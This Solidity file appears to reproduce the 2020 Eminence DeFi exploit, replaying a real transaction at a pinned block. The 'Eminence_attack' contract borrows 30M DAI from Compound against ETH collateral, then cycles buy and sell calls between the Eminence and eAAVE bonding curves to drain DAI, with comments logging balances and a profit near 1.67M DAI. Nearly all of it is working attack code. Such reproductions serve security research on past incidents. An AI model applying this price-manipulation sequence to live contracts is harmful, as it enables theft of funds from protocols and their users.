// SPDX-License-Identifier: AGPL-3.0-or-later
pragma solidity ^0.7.0;
pragma experimental ABIEncoderV2;
import "./interface.sol";
//Block 10954411
//Block index 3
//Timestamp Tue, 29 Sep 2020 01:20:41 +0000
//Gas price 555 gwei
//Gas limit 3568167

// tx: 0x3503253131644dd9f52802d071de74e456570374d586ddd640159cf6fb9b8ad8

contract Eminence_attack {
    address EOA;
    address private constant WETHAddress = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant UniswapDAI2ETHAddress = 0xA478c2975Ab1Ea89e8196811F51A7B7Ade33eB11;
    address private constant UniswapV2Router02Address = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address private constant DAIAddress = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address private constant EminenceAddress = 0x5ade7aE8660293F2ebfcEfaba91d141d72d221e8;
    address private constant eAAVEAddress = 0xc08f38f43ADB64d16Fe9f9eFCC2949d9eddEc198;
    address private constant cDAIAddress = 0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643;
    address private constant cETHAddress = 0x4Ddc2D193948926D02f9B1fE9e1daa0718270ED5;
    address private constant comptrollerAddress = 0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B;

    EminenceCurrency Eminence = EminenceCurrency(EminenceAddress);
    IERC20 DAI = IERC20(DAIAddress);
    EminenceCurrency eAAVE = EminenceCurrency(eAAVEAddress);

    ICEther cETH = ICEther(payable(cETHAddress));
    CTokenInterface cDAI = CTokenInterface(cDAIAddress);
    uint256 borroweddDAI = 0;
    string str1 = "";
    string str2 = "";
    string str3 = "";
    string str4 = "";

    constructor() payable {
        require(msg.value == 140000 ether, "loan amount does not match");
        DAI.approve(EminenceAddress, 2 ** 256 - 1);
        Eminence.approve(eAAVEAddress, 2 ** 256 - 1);
        EOA = msg.sender;
    }

    receive() external payable {}

    // loan amount = 15M DAI.
    function attack() public {
        // address[] memory ad = new address[](2);
        // ad[0] = WETHAddress;
        // ad[1] = DAIAddress;
        // IUniswapV2Router02(UniswapV2Router02Address).swapETHForExactTokens{value: 48000 ether} (15000000*10**18, ad, address(this), 2000000000);
        address[] memory markets = new address[](2);
        markets[0] = cETHAddress;
        markets[1] = cDAIAddress;
        ComptrollerInterface comptroller = ComptrollerInterface(
            comptrollerAddress
        );
        comptroller.enterMarkets(markets);

        cETH.mint{value : 140000 ether}();
        borroweddDAI = 30000000 * 10 ** 18;
        cDAI.borrow(borroweddDAI);
        //  ---------------------------------------------------------------------------------------------------------------------

        // Action 1:  DAI -> Eminence   State: Eminence
        //            State: Eminence
        //  Eminence Total Supply: 1362803143 551266828435981980 DAI balance: 14786580 432831687370238855
        Eminence.buy(15000000 * 10 ** 18, 0);
        //  Eminence Total Supply: 2746454758 601565648320828266 DAI balance: 29786580 432831687370238855
        // EMN balance: 1383651615  050298 819884 846286


        // Action 2:  Eminence -> eAAVE   State: eAAVE
        //            State: eAAVE
        // eAAVE total supply: 318070 589246634004069742
        eAAVE.buy(691825807525149409942423143, 0);
        // eAAVE total supply: 890502 502674108365633203
        // eAAVE balance: 572431  913427 474361 563461

        // Action 3:  Eminence -> DAI    State: Eminence
        //            State: Eminence
        // Eminence Total Supply: 2054628951076416238378405123 DAI balance: 29786580432831687370238855
        Eminence.sell(691825807525149409942423143, 0);
        // Eminence Total Supply: 1362803143551266828435981980 DAI balance: 19760023385043548062097400
        // DAI Out: 10026557 047788139308141455

        // Action 4:  eAAVE -> Eminence   State: eAAVE
        //            State: eAAVE
        // eAAVE total supply: 890502502674108365633203
        eAAVE.sell(572431913427474361563461, 0);
        // eAAVE total supply: 318070589246634004069742
        // Eminence balance: 691825807    525149 409942 423042

        // Action 5: Eminene -> DAI
        // Eminence Total Supply: 2054628951 076416238378405022 DAI balance: 19760023 385043548062097400
        Eminence.sell(691825807525149409942423042, 0);
        // Eminence Total Supply: 1362803143 551266828435981980 DAI balance: 13112297 951916345652736164
        // DAI Out: 6647725  


        revert(ProfitSummary());
        // DAI profit: 1674282 480915341717502691
    }

    function ProfitSummary() internal view returns (string memory _uintAsString)
    {
        uint256 balance1 = DAI.balanceOf(address(this));
        return append("DAI balance: ", uint2str(balance1));
    }

    function EminenceSummary() internal returns (string memory _uintAsString) {
        uint256 totalSupply = Eminence.totalSupply();
        uint256 DAIBalance = DAI.balanceOf(EminenceAddress);
        str1 = append("Eminence Total Supply: ", uint2str(totalSupply));
        str1 = append(str1, "  ");
        str2 = append("DAI balance: ", uint2str(DAIBalance));
        return append(str1, str2);
    }

    function eAAVESummary() internal view returns (string memory _uintAsString){
        uint totalSupply = eAAVE.totalSupply();
        return append("eAAVE total supply: ", uint2str(totalSupply));
    }

    // below: helper functions

    function uint2str(uint256 _i)
    internal
    pure
    returns (string memory _uintAsString)
    {
        if (_i == 0) {
            return "0";
        }
        uint256 j = _i;
        uint256 len;
        while (j != 0) {
            len++;
            j /= 10;
        }
        bytes memory bstr = new bytes(len);
        uint256 k = len - 1;
        while (_i != 0) {
            bstr[k--] = bytes1(uint8(48 + (_i % 10)));
            _i /= 10;
        }
        return string(bstr);
    }

    function append(string memory a, string memory b)
    internal
    pure
    returns (string memory){
        return string(abi.encodePacked(a, b));
    }

    function appendWithSpace(string memory a, string memory b) internal pure returns (string memory) {
        return append(a, append(" ", b));
    }
}
